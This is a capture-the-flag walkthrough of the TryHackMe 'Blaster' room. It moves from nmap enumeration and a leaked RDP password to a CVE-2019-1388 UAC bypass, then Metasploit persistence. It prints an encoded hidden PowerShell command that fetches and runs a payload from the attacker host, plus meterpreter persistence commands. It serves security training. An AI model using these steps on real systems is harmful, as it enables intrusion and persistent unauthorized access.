# TryHackme: Blaster Challenge

Room URL: https://tryhackme.com/room/blaster


## Objective

The room objective is to look for alternative modes of exploitation without the use of Metasploit or any exploitation tools in general beyond nmap and dirbuster. This is the vulnerability we will exploit -> **CVE-2019-1388**

## Enumeration

I first started basic scanning, but the host seems to block ping probes. To prevent this, I used `-Pn` option
```bash
nmap -Pn 10.10.119.236
Starting Nmap 7.95 ( https://nmap.org ) 
Nmap scan report for 10.10.119.236
Host is up (0.14s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
```

I also used the `-A` option to reveal more information about the target opening services.

```bash
nmap -A -p80,3389 -n -Pn 10.10.119.236

Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 09:17 EDT
Nmap scan report for 10.10.119.236
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2025-07-21T13:17:39+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2025-07-20T12:50:17
|_Not valid after:  2026-01-19T12:50:17
|_ssl-date: 2025-07-21T13:17:44+00:00; +8s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (86%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- Port 80 -> Running Microsoft IIS 10.0 (Windows web server)
- Port 3389 -> Running Microsoft Terminal Services (RDP)

Check the running web server first.

<img width="1354" height="822" alt="image" src="https://github.com/user-attachments/assets/1c94c9fd-0f70-4694-86fb-ed15930a0748" />

I used `Dirsearch` to search for hidden pages.

<img width="1050" height="401" alt="image" src="https://github.com/user-attachments/assets/66888b04-c404-4c49-a4ce-ed61c7d084aa" />
<img width="1378" height="834" alt="image" src="https://github.com/user-attachments/assets/b9a13094-93e8-48b4-8984-deb4bf8d161e" />


clicking on **Tron Arcade Cabinet**, will prompt:

<img width="1405" height="820" alt="image" src="https://github.com/user-attachments/assets/1e663790-57a4-4776-8efe-709e9c27a817" />


The blog was posted by wade

<img width="1576" height="837" alt="image" src="https://github.com/user-attachments/assets/6bffa248-3d44-47a0-aa2c-7e335318923f" />
<img width="1271" height="819" alt="image" src="https://github.com/user-attachments/assets/113509cf-2245-41f3-b0e8-4ceab46d4fc2" />

The error from the login page confirms that the username is Wade, but we need to find the password. Explore the remaining pages, and you will find on the page **Ready Player One**, Wade posted his password in the comment section.

<img width="1434" height="772" alt="image" src="https://github.com/user-attachments/assets/c6ec37d2-e53c-49ac-a2f9-23bf60550cc9" />

Now that we have some credentials, let's test them on the second open service: RDP. 

## RDP

Login to the Windows machine remotely using `xfreerdp` tool.
```bash
xfreerdp /u:wade /p:parzival /v:10.10.119.236
```
<img width="1758" height="747" alt="image" src="https://github.com/user-attachments/assets/e96a2f88-b53c-4429-bffb-421cfb330994" />


To search for internet history, search in Internet Explorer. For some reason, it only shows me today's history.

<img width="978" height="601" alt="image" src="https://github.com/user-attachments/assets/64bdfb25-7a07-4619-bce7-6406ecce1ef6" />


## Exploit CVE-2019-1388


**CVE-2019-1388** is a privilege escalation vulnerability that affects the Windows Certificate Dialog. It occurs when a user runs a signed executable like `hhupd.exe`, and the dialog fails to enforce privilege separation correctly

To exploit it:
- Double-click on `hhupd.exe`.
- In the prompt that appears, click “`Show more details`”.

<img width="474" height="475" alt="image" src="https://github.com/user-attachments/assets/3a19a6a5-dd12-42d1-b94b-7195fbbecf36" />

- Then click “`Show information about the publisher's certificate.`”

<img width="515" height="525" alt="image" src="https://github.com/user-attachments/assets/80203a24-7705-4ca4-bfa6-e8deb0431b1c" />

- In the certificate window, click on the “`Issued by`” link.

<img width="460" height="520" alt="image" src="https://github.com/user-attachments/assets/70d99968-0609-4450-a60d-7fc4e127a437" />

- This opens Internet Explorer with elevated privileges.

<img width="976" height="641" alt="image" src="https://github.com/user-attachments/assets/8d2c8867-63a9-430b-a57d-04b3a38cb17d" />

- Press `Ctrl + S` to open the Save As window.
- In the File Explorer window, type `cmd` in the address bar and hit Enter.
This gives you a command prompt with administrator privileges, effectively bypassing UAC.

<img width="993" height="741" alt="image" src="https://github.com/user-attachments/assets/7cae96d0-aa00-4bbb-b74f-b654150a7faa" />

## Persistence

To establish a persistence on the target machine, we will use this module from metasploit
`exploit/multi/script/web_delivery'` -> The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection, RDP Session, Local Access or maybe Remote Command Execution.

```bash
msf6 exploit(multi/script/web_delivery) > show options 

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be a
                                       n address on the local machine or 0.0.0.0 to listen on all addre
                                       sses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (python/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Python



View the full module info with the info, or info -d command.

```
Set your LHOST and LPORT, and set the exploit target to PowerShell since Python is not installed on Windows by default.

```bash
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
    0   Python
    1   PHP
=>  2   PSH
    3   Regsvr32
    4   pubprn
    5   SyncAppvPublishingServer
    6   PSH (Binary)
    7   Linux
    8   Mac OS X

```
Finally, set the payload 
```bash
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_http
payload => windows/meterpreter/reverse_http
```

**Last Check:**
```bash
msf6 exploit(multi/script/web_delivery) > show options

Module options (exploit/multi/script/web_delivery):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be a
                                       n address on the local machine or 0.0.0.0 to listen on all addre
                                       sses.
   SRVPORT  8080             yes       The local port to listen on.
   SSL      false            no        Negotiate SSL for incoming connections
   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                   no        The URI to use for this exploit (default is random)


Payload options (windows/meterpreter/reverse_http):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.9.8.180       yes       The local listener hostname
   LPORT     80               yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   2   PSH



View the full module info with the info, or info -d command.
```

**Run the payload**
```bash
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on http://10.9.8.180:80
[*] Using URL: http://10.9.8.180:8080/GtWFCGzoAD
[*] Server started.
[*] Run the following command on the target machine:
msf6 exploit(multi/script/web_delivery) > powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABvAEEAeAA0AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAG8AQQB4ADQALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABvAEEAeAA0AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADgALgAxADgAMAA6ADgAMAA4ADAALwBHAHQAVwBGAEMARwB6AG8AQQBEAC8AQwBaAGQAZQBaAEgAcwAxAFUARgAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AOQAuADgALgAxADgAMAA6ADgAMAA4ADAALwBHAHQAVwBGAEMARwB6AG8AQQBEACcAKQApADsA
```

Now we can copy the payload and paste it to the target machine with administrator privileges.

<img width="999" height="770" alt="image" src="https://github.com/user-attachments/assets/d649fa90-28a1-48b6-be9d-128030dc5bc9" />

Once the payload runs on the target machine, a session will be created in our Metasploit console.

<img width="1842" height="861" alt="image" src="https://github.com/user-attachments/assets/6e22fd6e-3817-469e-b4c5-51441e7fb096" />


```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

To automatically start the agent when the system boots run these commands.

```bash
meterpreter > run persistence -X
meterpreter > run persistence -U -i 5 -p 80 -r 10.9.8.180

```


## Reference:

- *https://www.offsec.com/metasploit-unleashed/meterpreter-service/*
- *https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1388*
